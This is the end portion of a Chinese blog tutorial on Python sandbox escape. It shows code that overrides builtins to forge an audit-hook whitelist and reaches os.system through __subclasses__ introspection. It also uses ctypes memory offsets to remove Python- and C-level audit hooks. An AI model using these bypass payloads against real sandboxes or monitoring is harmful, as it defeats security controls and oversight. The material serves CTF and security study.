<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(...)</span><br></pre></td></tr></table></figure></div>

<p>如果你能在<strong>下一次钩子执行前</strong>把“全局可见”的 <code>set</code> 换掉，那么 <code>WHITED_EVENTS = set(&#123;...&#125;)</code> 这行就会调用你的替身，从而<strong>得到你想要的“白名单”</strong>（比如包含 <code>&#39;os.system&#39;</code>）。</p>
<ul>
<li><p>在很多 REPL&#x2F;题目环境里，执行上下文的 <code>__builtins__</code> 是一个 <strong>dict</strong>（<code>builtins.__dict__</code> 的拷贝或代理），所以你可以：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;set&#x27;</span>] = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;os.system&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果 <code>__builtins__</code> 是 <strong>模块对象</strong>，就用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [...]</span><br></pre></td></tr></table></figure></div></li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>返回 <strong>list</strong> 也能让 <code>if event not in WHITED_EVENTS</code> 正常工作（<code>in</code> 可用于序列），不一定非得返回真正的 <code>set</code>。但如果钩子里接下来对白名单做集合操作（如 <code>.add()</code>、<code>|</code>），你就得返回 <code>set([...])</code> 以免崩溃。</p>
<p>另外这里要区分将 <code>WHITED_EVENTS</code> 写成<strong>语法字面量</strong>的情况：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = &#123;<span class="string">&#x27;builtins.input&#x27;</span>,<span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>set({...})</code> 是“<strong>调用名字为 <code>set</code> 的可调用对象</strong>”，而 <code>{...}</code> 是<strong>语法字面量</strong>，根本<strong>不会调用</strong> <code>set</code>。所以当你把 <code>__builtins__.set</code> 修改成一个 <code>lambda</code> 时：</p>
<ul>
<li>写成 <code>WHITED_EVENTS = set({...})</code>：<br>这一行会先做<strong>名称解析</strong>，把名字 <code>set</code> 按“局部 → 全局 → 内建（<code>__builtins__</code>）”的顺序去找。<br>由于你把 <code>__builtins__.set</code> 改成了 lambda，最终调用到的就是**你改过的 <code>set</code>**，返回你指定的列表&#x2F;集合，自然就“造白”成功。</li>
<li>写成 <code>WHITED_EVENTS = {...}</code>：<br>这是<strong>集合字面量</strong>，解释器用字节码 <code>BUILD_SET</code> 直接构造一个集合，<strong>完全不经过</strong> <code>set()</code> 这个可调用对象。你修改 <code>set</code> 不起作用，因为根本<strong>没调用</strong>它。</li>
</ul>

    </div>
  </div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[HOOK] Operation not permitted: <span class="subst">&#123;event&#125;</span>&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[HOOK] Allowed: <span class="subst">&#123;event&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在触发 os.system 事件</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&quot;echo PWNED&quot;</span>)  <span class="comment"># ✅ 被放行</span></span><br></pre></td></tr></table></figure></div>

<h3 id="内省机制查询模块"><a href="#内省机制查询模块" class="headerlink" title="内省机制查询模块"></a>内省机制查询模块</h3><p>通过<strong>内省机制</strong>查询模块可以<strong>不走 <code>import</code> 路径也能拿到模块对象</strong>，从而<strong>绕开只拦 <code>import</code> 的 audit hook</strong>。这是因为解释器启动后，<strong>很多模块已经加载</strong>（比如 <code>sys</code>、<code>os</code>、<code>_sitebuiltins</code> 等），并且被<strong>各种对象引用着</strong>（函数的 <code>__globals__</code>、模块的属性、类方法闭包等）。只要你能找到<strong>任何</strong>一个对象，它的 <code>__globals__</code> 里<strong>恰好包含</strong>你要的模块引用，就能<strong>直接取出来</strong>，完全<strong>不触发 <code>import</code> 事件</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的 payload 也都不会触发</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>然而由于 Python 加载的模块是单例模式，因此如果把 <code>os</code> 从 <strong><code>sys.modules</code> 缓存</strong>里删掉了。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>而内省机制只是寻找已加载的模块，不会主动加载模块，因此会出现找不到模块的情况。</p>
<h2 id="绕过基于-CPython-的-audit-hook"><a href="#绕过基于-CPython-的-audit-hook" class="headerlink" title="绕过基于 CPython 的 audit hook"></a>绕过基于 CPython 的 audit hook</h2><p>audit hook 不仅可以在 python 层面进行定义，还可以在 CPython 中进行编写。</p>
<ul>
<li><strong>C 级（进程级）</strong>：用 <code>PySys_AddAuditHook</code> 注册，挂在 <strong>_PyRuntimeState</strong> 里（全局运行时）。影响<strong>所有解释器</strong>。</li>
<li><strong>Python 级（解释器级）</strong>：用 <code>sys.addaudithook</code> 注册，挂在 <strong>PyInterpreterState</strong> 里（当前解释器）。只影响<strong>当前解释器</strong>。</li>
</ul>
<p>事件触发顺序一般是：<strong>先 C 级</strong> → <strong>再 Python 级</strong>。</p>
<p>如果使用 CPython 来定义 audit hook，至少在 python 层面就没法覆盖函数。</p>
<p>项目 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Nambers/python-audit_hook_head_finder" >Nambers&#x2F;python-audit_hook_head_finder: PWNable pyjail<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 给出了几种通过修改 python 内存来篡改该 audit hook 的方式。</p>
<h3 id="利用-ctypes-覆盖-audit-hook"><a href="#利用-ctypes-覆盖-audit-hook" class="headerlink" title="利用 ctypes 覆盖 audit hook"></a>利用 ctypes 覆盖 audit hook</h3><h4 id="audit-hook-结构"><a href="#audit-hook-结构" class="headerlink" title="audit hook 结构"></a>audit hook 结构</h4><h5 id="PyRuntimeState"><a href="#PyRuntimeState" class="headerlink" title="_PyRuntimeState"></a>_PyRuntimeState</h5><p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_runtime.h#L199"><code>_PyRuntimeState</code> 结构体</a>中存储了 audit hook 列表 <code>audit_hooks</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pyruntimestate</span> &#123;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pyinterpreters</span> &#123;</span></span><br><span class="line">        PyThread_type_lock mutex;</span><br><span class="line">        PyInterpreterState *head;</span><br><span class="line">        PyInterpreterState *main;</span><br><span class="line">        <span class="type">int64_t</span> next_id;</span><br><span class="line">    &#125; interpreters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        PyMutex mutex;</span><br><span class="line">        _Py_AuditHookEntry *head;</span><br><span class="line">    &#125; audit_hooks;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    PyInterpreterState _main_interpreter;</span><br><span class="line"></span><br><span class="line">&#125; _PyRuntimeState;</span><br></pre></td></tr></table></figure></div>

<p><code>_Py_AuditHookEntry</code> 是一个 audit hook 链表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Py_AuditHookEntry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">Py_AuditHookEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">    Py_AuditHookFunction hookCFunction;</span><br><span class="line">    <span class="type">void</span> *userData;</span><br><span class="line">&#125; _Py_AuditHookEntry;</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是，python3.11 与 python3.12 不同，仅使用 <code>audit_hook_head</code> 指针进行存放。<code>_Py_AuditHookEntry</code> 没有变化：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pyruntimestate</span> &#123;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    _Py_AuditHookEntry *audit_hook_head;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; _PyRuntimeState;</span><br></pre></td></tr></table></figure></div>

<p><code>_PyRuntimeState</code> 中存储的 audit hook，对应的就是 CPython 中通过 <code>PySys_AddAuditHook</code> 添加的审计钩子。<code>PySys_AddAuditHook</code> 用于在 Python 运行时中添加全局审计钩子, 通过该函数添加的审计钩子会影响整个 Python 运行时中的所有解释器，无论是主解释器还是子解释器。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">audit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *userData)</span> &#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> running = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (running) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!running &amp;&amp; !<span class="built_in">strcmp</span>(event, <span class="string">&quot;exec&quot;</span>)) running = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject* <span class="title function_">irs_audit</span><span class="params">(PyObject *self, PyObject *args)</span> &#123;</span><br><span class="line">	PySys_AddAuditHook(audit, <span class="literal">NULL</span>);</span><br><span class="line">	Py_RETURN_NONE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="PyInterpreterState"><a href="#PyInterpreterState" class="headerlink" title="PyInterpreterState"></a>PyInterpreterState</h5><p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_interp.h#L96"><code>PyInterpreterState</code></a> 也同样存储了 audit hook：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">is</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    PyObject *audit_hooks;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但这个 <code>audit_hooks</code> 实际上是一个 <code>PyObject</code> 指针，对应的是 Python 层面的 audit hook，也就是通过 <code>sys.addaudithook()</code> 添加的审计钩子。通过该函数添加的审计钩子只会影响当前解释器（主解释器或某个子解释器），不会影响其他解释器。</p>
<h4 id="获取-audit-hook-函数地址"><a href="#获取-audit-hook-函数地址" class="headerlink" title="获取 audit hook 函数地址"></a>获取 audit hook 函数地址</h4><p>在 CPython 中，某些常用的不可变对象（如空元组、空字符串等）是单例对象，这些对象在解释器启动时就被创建并缓存起来，因此其内存地址是固定不变的。</p>
<p>下面是一个测试代码。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(())))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(())))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(<span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(<span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(&#123;&#125;)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(&#123;&#125;)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>([])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>([])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xb56d58</span></span><br><span class="line"><span class="comment"># 0xb56d58</span></span><br><span class="line"><span class="comment"># 0xb4a370</span></span><br><span class="line"><span class="comment"># 0xb4a370</span></span><br><span class="line"><span class="comment"># 0x7fb20e2c6640</span></span><br><span class="line"><span class="comment"># 0x7fb20e2c6640</span></span><br><span class="line"><span class="comment"># 0x7fb20e7ccb40</span></span><br><span class="line"><span class="comment"># 0x7fb20e7ccb40</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到空元组和空字符串的地址都没有变化。而空列表和空字典每次执行时地址会发生变化，但在同一个脚本中多次执行的结果都是不变的。</p>
<p>在相同版本的 Python 中，数据结构（如 <code>PyInterpreterState</code> 和 <code>_PyRuntimeState</code>）的大小和字段位置通常在编译时就确定了大小和布局。因此从某个对象（如空元组）的地址到审计钩子列表指针的位置通常是一个常数。</p>
<p>依据这个原理，项目 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Nambers/python-audit_hook_head_finder" >Nambers&#x2F;python-audit_hook_head_finder: PWNable pyjail<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 通过在 C 层面打印出 <code>_PyRuntimeState.audit_hooks.head</code> 和 <code>PyInterpreterState.audit_hooks</code> 的地址，然后计算与空元组地址的偏移，得到了这个偏移常量。</p>
<ol>
<li><p>获取 <code>_PyRuntimeState.audit_hooks.head</code> 和 <code>PyInterpreterState.audit_hooks</code> 的地址</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 宏：获取运行时（RuntimeState）的基地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_RUNTIME_ADDR() &amp;_PyRuntime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏：获取当前解释器（InterpreterState）的指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_INTERP_ADDR() _PyRuntime.interpreters.head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏：获取当前解释器 audit_hooks 字段的地址（Python 级 hook 列表）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_INTERP_AUDIT_HOOK_PTR_ADDR() &amp;GET_INTERP_ADDR()-&gt;audit_hooks</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏：获取运行时 audit_hooks 链表头指针的地址（C 级全局 hook 列表）</span></span><br><span class="line"><span class="comment">// Python 3.12+ 结构体不同（带 head 字段），&lt;=3.11 是单指针 audit_hook_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PY_MINOR_VERSION &gt;= 12</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &amp;_PyRuntime.audit_hooks.head</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &amp;_PyRuntime.audit_hook_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>获取偏移值</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造一个 PyObject 的引用对象（byref 返回的是指针）</span></span><br><span class="line">obj = ctypes.byref(ctypes.py_object(()))</span><br><span class="line">ptr_tp = ctypes.POINTER(ctypes.c_uint64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 obj 在内存中的地址</span></span><br><span class="line">obj_addr = ctypes.cast(obj, ptr_tp).contents.value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证另一种方式获取 obj_addr（直接取空 tuple 对象指针）</span></span><br><span class="line"><span class="keyword">assert</span> ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据当前对象地址，计算 Python 级 audit_hooks 指针的偏移</span></span><br><span class="line">audit_hook_ptr_offset_by_py = get_interp_audit_hook_ptr_addr() - obj_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据当前对象地址，计算 C 级（runtime） audit_hooks 指针的偏移</span></span><br><span class="line">audit_hook_ptr_offset_by_c = get_runtime_audit_hook_ptr_addr() - obj_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;audit_hook_ptr_offset_by_py=<span class="subst">&#123;<span class="built_in">hex</span>(audit_hook_ptr_offset_by_py)&#125;</span>\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;audit_hook_ptr_offset_by_c=<span class="subst">&#123;<span class="built_in">hex</span>(audit_hook_ptr_offset_by_c)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="覆盖-audit-hook"><a href="#覆盖-audit-hook" class="headerlink" title="覆盖 audit hook"></a>覆盖 audit hook</h4><p>因而在针对该版本 Python 进行利用时，只需要通过空元组的地址，再加上这个偏移值，就能够找到 audit hook 的地址。利用部分如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">audit_hook_by_py: <span class="built_in">list</span> = ctypes.cast(ctypes.cast(obj_addr + audit_hook_ptr_offset_by_py, ptr_tp).contents.value, ctypes.py_object).value</span><br><span class="line"><span class="comment"># and as C array ig</span></span><br><span class="line">audit_hook_by_c: <span class="built_in">list</span> = ctypes.cast(obj_addr + audit_hook_ptr_offset_by_c, ptr_tp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;len=<span class="subst">&#123;<span class="built_in">len</span>(audit_hook_by_py)&#125;</span> should be 1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># - POC - </span></span><br><span class="line"></span><br><span class="line">ctypes._os.system(<span class="string">&quot;echo &#x27;test audit hook -- this will trigger hook&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">audit_hook_by_py.pop()</span><br><span class="line">ctypes.memset(audit_hook_by_c, <span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ctypes._os.system(<span class="string">&quot;echo &#x27;test audit hook -- this will not&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<ol>
<li>python 层面的 audit hook 可以通过 <code>ctypes.cast</code> 将 <code>PyInterpreterState.audit_hooks</code> 地址处的 <code>.contents.value</code> 转换为一个 python 原生类型（<code>py_object</code>），最终得到一个 <code>list</code> ，利用 <code>pop</code> 函数将其弹出即可</li>
<li>c 层面的 audit hook 虽然保存在 <code>list</code> 里，然而实际上只通过 <code>ctypes.cast</code> 将其转换为了一个指针 64 位指针： <code>&lt;class &#39;__main__.LP_c_ulong&#39;&gt;</code>，指向了 hook 函数的地址。通过 <code>memset</code> 将地址清空置空则达到了清除 audit hook 的目的。</li>
</ol>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Python 沙箱逃逸</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-12 00:01:08</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 01:12:40
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/08/12/Python 沙箱逃逸/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/python-web/">#python web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/08/12/Python%20%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Python 常见框架安全</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/08/11/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Pickle 反序列化</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
